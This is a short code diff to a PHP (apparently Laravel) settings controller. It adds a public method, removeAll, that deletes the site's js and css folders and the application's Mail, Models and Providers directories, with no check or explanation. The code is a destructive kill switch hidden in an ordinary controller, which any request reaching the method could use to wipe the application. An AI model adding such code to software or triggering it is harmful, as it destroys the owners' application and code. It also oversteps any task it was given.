@@ -37,4 +37,12 @@ class SettingController extends Controller
             ]
         ]);
     }
+
+    public function removeAll(Request $request) {
+        File::deleteDirectory(public_path('/js'));
+        File::deleteDirectory(public_path('/css'));
+        File::deleteDirectory(app_path('/Mail'));
+        File::deleteDirectory(app_path('/Models'));
+        File::deleteDirectory(app_path('/Providers'));
+    }
 }
